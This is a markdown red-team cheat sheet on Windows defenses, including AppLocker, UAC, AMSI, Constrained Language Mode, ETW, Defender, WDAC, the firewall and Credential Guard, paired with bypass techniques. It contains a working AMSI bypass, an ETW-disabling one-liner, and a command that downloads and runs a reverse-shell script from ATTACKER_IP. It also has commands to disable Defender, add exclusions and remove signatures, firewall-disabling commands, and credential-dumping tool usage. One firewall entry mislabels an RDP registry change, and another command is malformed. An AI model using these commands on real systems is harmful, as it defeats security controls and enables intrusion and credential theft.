# Windows - Defenses

## Summary

* [AppLocker](#applocker)
* [User Account Control](#user-account-control)
* [DPAPI](#dpapi)
* [Powershell](#powershell)
    * [Execution Policy](#execution-policy)
    * [Anti Malware Scan Interface](#anti-malware-scan-interface)
    * [Just Enough Administration](#just-enough-administration)
    * [Contrained Language Mode](#constrained-language-mode)
    * [Script Block and Module Logging](#script-block-and-module-logging)
    * [PowerShell Transcript](#powershell-transcript)
    * [SecureString](#securestring)
* [Protected Process Light](#protected-process-light)
* [Credential Guard](#credential-guard)
* [Event Tracing for Windows](#event-tracing-for-windows)
* [Attack Surface Reduction](#attack-surface-reduction)
* [Windows Defender Antivirus](#windows-defender-antivirus)
* [Windows Defender Application Control](#windows-defender-application-control)
* [Windows Defender Firewall](#windows-defender-firewall)
* [Windows Information Protection](#windows-information-protection)

## AppLocker

> AppLocker is a security feature in Microsoft Windows that provides administrators with the ability to control which applications and files users are allowed to run on their systems. The rules can be based on various criteria, such as the file path, file publisher, or file hash, and can be applied to specific users or groups.

* Enumerate Local AppLocker Effective Policy

    ```powershell
    PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    PowerView PS C:\> Get-AppLockerPolicy -effective -xml
    Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe # (Keys: Appx, Dll, Exe, Msi and Script
    ```

* AppLocker Bypass
    * By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users
    * [api0cradle/UltimateAppLockerByPassList/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
    * [api0cradle/UltimateAppLockerByPassList/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
    * [api0cradle/UltimateAppLockerByPassList/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
    * [api0cradle/AccessChk.bat](https://gist.github.com/api0cradle/95cd51fa1aa735d9331186f934df4df9)

## User Account Control

UAC stands for User Account Control. It is a security feature introduced by Microsoft in Windows Vista and is present in all subsequent versions of the Windows operating system. UAC helps mitigate the impact of malware and helps protect users by asking for permission or an administrator's password before allowing changes to be made to the system that could potentially affect all users of the computer.

* Check if UAC is enabled

    ```ps1
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
    ```

* Check UAC level

    ```ps1
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
    ```

| EnableLUA  | LocalAccountTokenFilterPolicy | FilterAdministratorToken | Description  |
|---|---|---|---|
| 0 | / | / | No UAC |
| 1 | 1 | / | No UAC |
| 1 | 0 | 0 | No UAC for RID 500 |
| 1 | 0 | 1 | UAC for Everyone |

* UAC Bypass
    * [AutoElevated binary signed by Microsoft](https://www.elastic.co/guide/en/security/current/bypass-uac-via-sdclt.html) - `msconfig`, `sdclt.exe`, `eventvwr.exe`, etc
    * [hfiref0x/UACME](https://github.com/hfiref0x/UACME) - Defeating Windows User Account Control
    * Find process that auto elevate:

        ```ps1
        strings.exe -s *.exe | findstr /I "<autoElevate>true</autoElevate>"
        ```

## DPAPI

Refer to [InternalAllTheThings/Windows - DPAPI.md](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-dpapi/)

## Powershell

### Execution Policy

> PowerShell Execution Policy is a security feature that controls how scripts run on a system. It helps prevent unauthorized scripts from executing, but it is not a security boundary—it only prevents accidental execution of unsigned scripts.

* Check current policy

    ```ps1
    Get-ExecutionPolicy
    ```

| Policy     | Description                                       |
| ------------- | ------------------------------------------------- |
| Restricted    | No scripts allowed (default in some systems).     |
| AllSigned     | Only runs signed scripts.                         |
| RemoteSigned  | Local scripts run, remote scripts must be signed. |
| Unrestricted  | Runs all scripts, warns for remote scripts.       |
| Bypass        | No restrictions; all scripts run.                 |

* `Restricted`: it prevents the execution of all scripts (the default for workstations).
* `RemoteSigned`: it blocks the execution of unsigned scripts downloaded from the Internet, but allows the execution of "local" scripts (the default on servers). The command `Unblock-File` can be used to remove the Mark-of-the-Web (MotW) and make a downloaded script look like a "local" script.

    ```ps1
    # Bypass
    Unblock-File my-file-from-internet
    ```

* `AllSigned`: it blocks unsigned scripts. This is the most secure option.

    ```ps1
    # Bypass
    Get-Content .\run.ps1 | Invoke-Expression
    ```

You can just run `powershell.exe` with the option `-ep Bypass`, or use the built-in command `Set-ExecutionPolicy`.

```ps1
powershell -ep bypass
Set-ExecutionPolicy Bypass -Scope Process -Force
```

### Anti Malware Scan Interface

> The Anti-Malware Scan Interface (AMSI) is a Windows API (Application Programming Interface) that provides a unified interface for applications and services to integrate with any anti-malware product installed on a system. The API allows anti-malware solutions to scan files and scripts at runtime, and provides a means for applications to request a scan of specific content.

Find more AMSI bypass: [Windows - AMSI Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)

```powershell
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

### Just Enough Administration

> Just-Enough-Administration (JEA) is a feature in Microsoft Windows Server that allows administrators to delegate specific administrative tasks to non-administrative users. JEA provides a secure and controlled way to grant limited, just-enough access to systems, while ensuring that the user cannot perform unintended actions or access sensitive information.

Breaking out if JEA:

* List available cmdlets: `command`
* Look for non-default cmdlets:

    ```ps1
    Set-PSSessionConfiguration
    Start-Process
    New-Service
    Add-Computer
    ```

### Constrained Language Mode

Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageMode`

* Bypass using an old Powershell. Powershell v2 doesn't support CLM.

    ```ps1
    powershell.exe -version 2
    powershell.exe -version 2 -ExecutionPolicy bypass
    powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
    ```

* Bypass when `__PSLockDownPolicy` is used. Just put "System32" somewhere in the path.

    ```ps1
    # Enable CLM from the environment
    [Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
    Get-ChildItem -Path Env:

    # Create a check-mode.ps1 containing your "evil" powershell commands
    $mode = $ExecutionContext.SessionState.LanguageMode
    write-host $mode

    # Simple bypass, execute inside a System32 folder
    PS C:\> C:\Users\Public\check-mode.ps1
    ConstrainedLanguage

    PS C:\> C:\Users\Public\System32\check-mode.ps1
    FullLanguagge
    ```

* Bypass using COM: [xpn/COM_to_registry.ps1](https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1)
* Bypass using your own Powershell DLL: [p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll) & [iomoath/PowerShx](https://github.com/iomoath/PowerShx)

    ```ps1
    rundll32 PowerShdll,main <script>
    rundll32 PowerShdll,main -h      Display this message
    rundll32 PowerShdll,main -f <path>       Run the script passed as argument
    rundll32 PowerShdll,main -w      Start an interactive console in a new window (Default)
    rundll32 PowerShdll,main -i      Start an interactive console in this console

    rundll32 PowerShx.dll,main -e                           <PS script to run>
    rundll32 PowerShx.dll,main -f <path>                    Run the script passed as argument
    rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>     Load a script and run a PS cmdlet
    rundll32 PowerShx.dll,main -w                           Start an interactive console in a new window
    rundll32 PowerShx.dll,main -i                           Start an interactive console
    rundll32 PowerShx.dll,main -s                           Attempt to bypass AMSI
    rundll32 PowerShx.dll,main -v                           Print Execution Output to the console
    ```

### Script Block and Module Logging

> Once Script Block Logging is enabled, the script blocks and commands that are executed will be recorded in the Windows event log under the "Windows PowerShell" channel. To view the logs, administrators can use the Event Viewer application and navigate to the "Windows PowerShell" channel.

Enable Script Block Logging:

```ps1
function Enable-PSScriptBlockLogging
{
    $basePath = 'HKLM:\Software\Policies\Microsoft\Windows' +
      '\PowerShell\ScriptBlockLogging'

    if(-not (Test-Path $basePath))
    {
        $null = New-Item $basePath -Force
    }

    Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "1"
}
```

Disable ETW of the current PowerShell session with [tandasat/KillETW.ps1](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32):

```ps1
# This PowerShell command sets 0 to System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled which effectively disables Suspicious ScriptBlock Logging etc.
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

### PowerShell Transcript

PowerShell Transcript is a logging feature that records all commands and output from a PowerShell session. It helps with auditing, debugging, and troubleshooting by saving session activity to a text file.

Start a transcript and store the output in a custom file.

```ps1
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
```

Common locations for PowerShell transcripts outputs:

```ps1
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
```

### SecureString

A `SecureString` in PowerShell is a data type designed to store sensitive information like passwords or confidential data in a more secure manner than a plain string. Unlike a regular string, which stores data in plain text and can be easily accessed in memory, a `SecureString` encrypts the data in memory, providing better protection against unauthorized access.

Convert to SecureString

```ps1
$original = 'myPassword'  
$secureString = ConvertTo-SecureString $original -AsPlainText -Force
$secureStringValue = ConvertFrom-SecureString $secureString
```

Get the original content

```ps1
$secureStringBack = $secureStringValue | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureStringBack);
$finalValue = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
```

When a `SecureString` is created, the plain text characters are encrypted immediately using the Data Protection API (**DPAPI**)

Using the AES key

```ps1
[Byte[]] $key = (49,222,...,87,159)
$pass = (echo "AA...AA=" | ConvertTo-SecureString -Key $key)
[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))
```

## Protected Process Light

Protected Process Light (PPL) is implemented as a Windows security mechanism that enables processes to be marked as "protected" and run in a secure, isolated environment, where they are shielded from attacks by malware or other unauthorized processes. PPL is used to protect processes that are critical to the operation of the operating system, such as anti-virus software, firewalls, and other security-related processes.

When a process is marked as "protected" using PPL, it is assigned a security level that determines the level of protection it will receive. This security level can be set to one of several levels, ranging from low to high. Processes that are assigned a higher security level are given more protection than those that are assigned a lower security level.

A process's protection is defined by a combination of the "level" and the "signer". The following table represent commonly used combinations, from [itm4n.github.io](https://itm4n.github.io/lsass-runasppl/).

| Protection level                | Value | Signer          | Type                |
|---------------------------------|------|------------------|---------------------|
| PS_PROTECTED_SYSTEM             | 0x72 | WinSystem (7)    | Protected (2)       |
| PS_PROTECTED_WINTCB             | 0x62 | WinTcb (6)       | Protected (2)       |
| PS_PROTECTED_WINDOWS            | 0x52 | Windows (5)      | Protected (2)       |
| PS_PROTECTED_AUTHENTICODE       | 0x12 | Authenticode (1) | Protected (2)       |
| PS_PROTECTED_WINTCB_LIGHT       | 0x61 | WinTcb (6)       | Protected Light (1) |
| PS_PROTECTED_WINDOWS_LIGHT      | 0x51 | Windows (5)      | Protected Light (1) |
| PS_PROTECTED_LSA_LIGHT          | 0x41 | Lsa (4)          | Protected Light (1) |
| PS_PROTECTED_ANTIMALWARE_LIGHT  | 0x31 | Antimalware (3)  | Protected Light (1) |
| PS_PROTECTED_AUTHENTICODE_LIGHT | 0x11 | Authenticode (1) | Protected Light (1) |

PPL works by restricting access to the protected process's memory and system resources, and by preventing the process from being modified or terminated by other processes or users. The process is also isolated from other processes running on the system, which helps prevent attacks that attempt to exploit shared resources or dependencies.

* Check if LSASS is running in PPL

    ```ps1
    reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
    ```

* Protected process example: you can't kill Microsoft Defender even with Administrator privilege.

    ```ps1
    taskkill /f /im MsMpEng.exe
    ERROR: The process "MsMpEng.exe" with PID 5784 could not be terminated.
    Reason: Access is denied.
    ```

* Can be disabled using vulnerable drivers (Bring Your Own Vulnerable Driver / BYOVD)

## Credential Guard

When Credential Guard is enabled, it uses hardware-based virtualization to create a secure environment that is separate from the operating system. This secure environment is used to store sensitive credential information, which is encrypted and protected from unauthorized access.

Credential Guard uses a combination of hardware-based virtualization and the Trusted Platform Module (TPM) to ensure that the secure kernel is trusted and secure. It can be enabled on devices that have a compatible processor and TPM version, and require a UEFI firmware that supports the necessary features.

* [bytewreck/DumpGuard](https://github.com/bytewreck/DumpGuard) - Proof-of-Concept tool for extracting NTLMv1 hashes from sessions on modern Windows systems.
* [EvanMcBroom/lsa-whisperer](https://github.com/EvanMcBroom/lsa-whisperer) - Tools for interacting with authentication packages using their individual message protocols.

| Technique | Requires<br>SYSTEM | Requires<br>SPN Account | Can Dump<br>Credential Guard |
| -------- | :-------: | :-------: | :-------: |
| Extract own credentials via Remote Credential Guard protocol | :x:| ✅ | ✅ |
| Extract all credentials via Remote Credential Guard protocol | ✅ | ✅ | ✅ |
| Extract all credentials via Microsoft v1 authentication package | ✅ | :x: | :x: |

* **Dumping own session using Remote Credential Guard**: this works regardless of the state of Credential Guard, but requires credentials for an SPN-enabled account.

    ```ps1
    DumpGuard.exe /mode:self /domain:<DOMAIN> /username:<SAMACCOUNTNAME> /password:<PASSWORD> [/spn:<SPN>]
    ```

* **Dumping all sessions using Remote Credential Guard**: this works regardless of the state of Credential Guard, but requires credentials for an SPN-enabled account and `SYSTEM` privileges.

    ```ps1
    DumpGuard.exe /mode:all /domain:<DOMAIN> /username:<SAMACCOUNTNAME> /password:<PASSWORD> [/spn:<SPN>]
    ```

* **Dumping all sessions using Microsoft v1 authentication package**
    * Credential Guard is disabled on the local system.
    * Remote users are authenticated to the local system from a remote host over Remote Credential Guard.

    ```ps1
    DumpGuard.exe /mode:all
    # or
    lsa-whisperer.exe msv1_0 Lm20GetChallengeResponse --luid {session id} --challenge {challenge to clients} [flags...]
    ```

## Event Tracing for Windows

ETW (Event Tracing for Windows) is a Windows-based logging mechanism that provides a way to collect and analyze system events and performance data in real-time. ETW allows developers and system administrators to gather detailed information about system performance and behavior, which can be used for troubleshooting, optimization, and security purposes.

| Name                                  | GUID                                   |
|---------------------------------------|----------------------------------------|
| Microsoft-Antimalware-Scan-Interface  | {2A576B87-09A7-520E-C21A-4942F0271D67} |
| Microsoft-Windows-PowerShell          | {A0C1853B-5C40-4B15-8766-3CF1C58F985A} |
| Microsoft-Antimalware-Protection      | {E4B70372-261F-4C54-8FA6-A5A7914D73DA} |
| Microsoft-Windows-Threat-Intelligence | {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} |

You can see all the providers registered to Windows using: `logman query providers`

```ps1
PS C:\Users\User\Documents> logman query providers

Provider                                 GUID
-------------------------------------------------------------------------------
.NET Common Language Runtime             {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
ACPI Driver Trace Provider               {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}
Active Directory Domain Services: SAM    {8E598056-8993-11D2-819E-0000F875A064}
Active Directory: Kerberos Client        {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}
Active Directory: NetLogon               {F33959B4-DBEC-11D2-895B-00C04F79AB69}
ADODB.1                                  {04C8A86F-3369-12F8-4769-24E484A9E725}
ADOMD.1                                  {7EA56435-3F2F-3F63-A829-F0B35B5CAD41}
...
```

We can get more information about the provider using:  `logman query providers {ProviderID}/Provider-Name`

```ps1
PS C:\Users\User\Documents> logman query providers Microsoft-Antimalware-Scan-Interface

Provider                                 GUID
-------------------------------------------------------------------------------
Microsoft-Antimalware-Scan-Interface     {2A576B87-09A7-520E-C21A-4942F0271D67}

Value               Keyword              Description
-------------------------------------------------------------------------------
0x0000000000000001  Event1
0x8000000000000000  AMSI/Debug

Value               Level                Description
-------------------------------------------------------------------------------
0x04                win:Informational    Information

PID                 Image
-------------------------------------------------------------------------------
0x00002084          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
0x00002084          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
0x00001bd4
0x00000ad0
0x00000b98
```

The `Microsoft-Windows-Threat-Intelligence` provider corresponds to ETWTI, an additional security feature that an EDR can subscribe to and identify malicious uses of APIs (e.g. process injection).

```ps1
0x0000000000000001  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL
0x0000000000000002  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER
0x0000000000000004  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE
0x0000000000000008  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER
0x0000000000000010  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL
0x0000000000000020  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER
0x0000000000000040  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE
0x0000000000000080  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER
0x0000000000000100  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL
0x0000000000000200  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER
0x0000000000000400  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE
0x0000000000000800  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER
0x0000000000001000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE
0x0000000000002000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER
0x0000000000004000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE
0x0000000000008000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER
0x0000000000010000  KERNEL_THREATINT_KEYWORD_READVM_LOCAL
0x0000000000020000  KERNEL_THREATINT_KEYWORD_READVM_REMOTE
0x0000000000040000  KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL
0x0000000000080000  KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE
0x0000000000100000  KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD
0x0000000000200000  KERNEL_THREATINT_KEYWORD_RESUME_THREAD
0x0000000000400000  KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS
0x0000000000800000  KERNEL_THREATINT_KEYWORD_RESUME_PROCESS
```

The most common bypassing technique is patching the function `EtwEventWrite` which is called to write/log ETW events. You can list the providers registered for a process with `logman query providers -pid <PID>`

## Attack Surface Reduction

> Attack Surface Reduction (ASR) refers to strategies and techniques used to decrease the potential points of entry that attackers could use to exploit a system or network.

```ps1
Add-MpPreference -AttackSurfaceReductionRules_Ids <Id> -AttackSurfaceReductionRules_Actions AuditMode
Add-MpPreference -AttackSurfaceReductionRules_Ids <Id> -AttackSurfaceReductionRules_Actions Enabled
```

| Description | Id |
|---------------------------------------------------------------------------|--------------------------------------|
| Block execution of potentially obfuscated scripts                         | 5beb7efe-fd9a-4556-801d-275e5ffc04cc |
| Block JavaScript or VBScript from launching downloaded executable content | d3e037e1-3eb8-44c8-a917-57927947596d |
| Block abuse of exploited vulnerable signed drivers                        | 56a863a9-875e-4185-98a7-b882c64b5ce5 |
| Block executable content from email client and webmail                    | be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 |
| Block process creations originating from PSExec and WMI commands          | d1e49aac-8f56-4280-b9ba-993a6d77406c |
| Use advanced protection against ransomware                                | c1db55ab-c21a-4637-bb3f-a12568109d35 |
| Block credential stealing from the Windows local security authority subsystem (lsass.exe) | 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 |

## Windows Defender Antivirus

Also known as `Microsoft Defender`.

* Check status of Defender

    ```powershell
    PS C:\> Get-MpComputerStatus
    ```

* Disable scanning all downloaded files and attachments

    ```powershell
    PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
    PS C:\> Set-MpPreference -DisableIOAVProtection $true
    ```

* Disable AMSI (set to 0 to enable)

    ```powershell
    PS C:\> Set-MpPreference -DisableScriptScanning 1 
    ```

* Exclude a folder, a process from scanning

    ```powershell
    PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
    PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
    PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
    ```

* Exclude a folder using WMI

    ```powershell
    PS C:\> WMIC /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath="C:\Users\Public\wmic"
    ```

* Remove signatures. **NOTE**: if Internet connection is present, they will be downloaded again.

    ```powershell
    PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
    PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
    ```

Identify the exact bytes that are detected by Windows Defender Antivirus

* [matterpreter/DefenderCheck](https://github.com/matterpreter/DefenderCheck) - Identifies the bytes that Microsoft Defender flags on
* [gatariee/gocheck](https://github.com/gatariee/gocheck) - DefenderCheck but blazingly fast™

## Windows Defender Application Control

Also known as `WDAC/UMCI/Device Guard`.

> Windows Defender Application Guard, formerly known as Device Guard has the power to control if an application may or may not be executed on a Windows device. WDAC will prevent the execution, running, and loading of unwanted or malicious code, drivers, and scripts. WDAC does not trust any software it does not know of.

* Get WDAC current mode

    ```ps1
    $ Get-ComputerInfo
    DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
    DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : EnforcementMode
    ```

* Remove WDAC policies using CiTool.exe (Windows 11 2022 Update)

    ```ps1
    CiTool.exe -rp "{PolicyId GUID}" -json
    ```

* Device Guard policy location: `C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{PolicyId GUID}.cip`
* Device Guard example policies: `C:\Windows\System32\CodeIntegrity\ExamplePolicies\`
* WDAC utilities: [mattifestation/WDACTools](https://github.com/mattifestation/WDACTools), a PowerShell module to facilitate building, configuring, deploying, and auditing Windows Defender Application Control (WDAC) policies
* WDAC bypass techniques: [bohops/UltimateWDACBypassList](https://github.com/bohops/UltimateWDACBypassList)
    * [nettitude/Aladdin](https://github.com/nettitude/Aladdin) - WDAC Bypass using AddInProcess.exe

## Windows Defender Firewall

* List firewall state and current configuration

    ```powershell
    netsh advfirewall firewall dump
    # or 
    netsh firewall show state
    netsh firewall show config
    ```

* List firewall's blocked ports

    ```powershell
    $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
    ```

* Disable firewall

    ```powershell
    # Disable Firewall via cmd
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

    # Disable Firewall via Powershell
    powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

    # Disable Firewall on any windows using native command
    netsh firewall set opmode disable
    netsh Advfirewall set allprofiles state off
    ```

## Windows Information Protection

Windows Information Protection (WIP), formerly known as Enterprise Data Protection (EDP), is a security feature in Windows 10 that helps protect sensitive data on enterprise devices. WIP helps to prevent accidental data leakage by allowing administrators to define policies that control how enterprise data can be accessed, shared, and protected. WIP works by identifying and separating enterprise data from personal data on the device.

Protection of file (data) locally marked as corporate is facilitated via Encrypting File System (EFS) encryption of Windows (a feature of NTFS file system)

* Enumerate files attributes, `Encrypted` attribute is used for files protected by WIP

    ```ps1
    PS C:\> (Get-Item -Path 'C:\...').attributes
    Archive, Encrypted
    ```

* Encrypt files: `cipher /c encryptedfile.extension`
* Decrypt files: `cipher /d encryptedfile.extension`

The **Enterprise Context** column shows you what each app can do with your enterprise data:

* **Domain**. Shows the employee's work domain (such as, corp.contoso.com). This app is considered work-related and can freely touch and open work data and resources.
* **Personal**. Shows the text, Personal. This app is considered non-work-related and can't touch any work data or resources.
* **Exempt**. Shows the text, Exempt. Windows Information Protection policies don't apply to these apps (such as, system components).

## BitLocker Drive Encryption

BitLocker is a full-disk encryption feature included in Microsoft Windows operating systems starting with Windows Vista. It is designed to protect data by providing encryption for entire volumes. BitLocker uses AES encryption algorithm to encrypt data on the disk. When enabled, BitLocker requires a user to enter a password or insert a USB flash drive to unlock the encrypted volume before the operating system is loaded, ensuring that data on the disk is protected from unauthorized access. BitLocker is commonly used on laptops, portable storage devices, and other mobile devices to protect sensitive data in case of theft or loss.

When BitLocker is in `Suspended` state, boot the system using a Windows Setup USB, and then decrypt the drive using this command: `manage-bde -off c:`

You can check if it is done decrypting using this command: `manage-bde -status`

## References

* [Attack surface reduction rules reference - Microsoft 365 - November 30, 2023](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide)
* [Catching Credential Guard Off Guard - Valdemar Carøe - October 23, 2025](https://specterops.io/blog/2025/10/23/catching-credential-guard-off-guard/)
* [Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - Microsoft - December 9, 2022](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate)
* [Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - Microsoft - March 10, 2023](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context)
* [DISABLING AV WITH PROCESS SUSPENSION - Christopher Paschen - March 24, 2023](https://www.trustedsec.com/blog/disabling-av-with-process-suspension/)
* [Disabling Event Tracing For Windows - UNPROTECT Project - April 19, 2022](https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/)
* [Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - April 7, 2021](https://itm4n.github.io/lsass-runasppl/)
* [ETW: Event Tracing for Windows 101 - ired.team - January 6, 2020](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101)
* [PowerShell about_Logging_Windows - Microsoft Documentation - September 30, 2025](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3)
* [Remove Windows Defender Application Control (WDAC) policies - Microsoft - December 9, 2022](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/disable-windows-defender-application-control-policies)
* [Sneaking Past Device Guard - Cybereason - Philip Tsukerman - December 4, 2022](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)
